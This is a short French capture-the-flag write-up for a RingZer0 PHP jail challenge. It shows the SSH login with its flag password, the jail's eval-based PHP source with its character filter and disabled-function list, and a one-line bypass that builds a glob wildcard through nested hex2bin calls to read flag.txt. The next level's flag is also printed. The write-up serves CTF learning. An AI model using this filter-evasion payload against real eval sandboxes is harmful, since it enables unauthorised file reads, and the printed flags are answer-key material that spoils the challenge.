ssh level3@challenges.ringzer0ctf.com -p 10225

Mot de passe: FLAG-D6jg9230H05II3ri5QB7L9166gG73l8H

```php
WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"

<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
	if(preg_match('/(\'|\"|`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
		return false;
	}
	return true;
}
if(filter($var)) {
	eval($var);
	echo "Command executed";
} else {
	echo "Restricted characters has been used";
}
echo "\n";
?>
```

hex2bin(hex2bin(3261)) donne * 
glob(*) retourne un array de tous les fichiers qui match le pattern (ici * donne tous les fichiers)
Mais si je mettais "*.txt" ca me retournerait un array des fichiers .txt (mais ici on ne peut pas faire ça vu que les guillemets sont des caractères illégaux)

L'index 0 donnait le fichier flag.txt donc voici le payload:

highlight_file(glob(hex2bin(hex2bin(3261)))[0]);

FLAG-X9uF51b0X570f616897kLN3It3K6m63c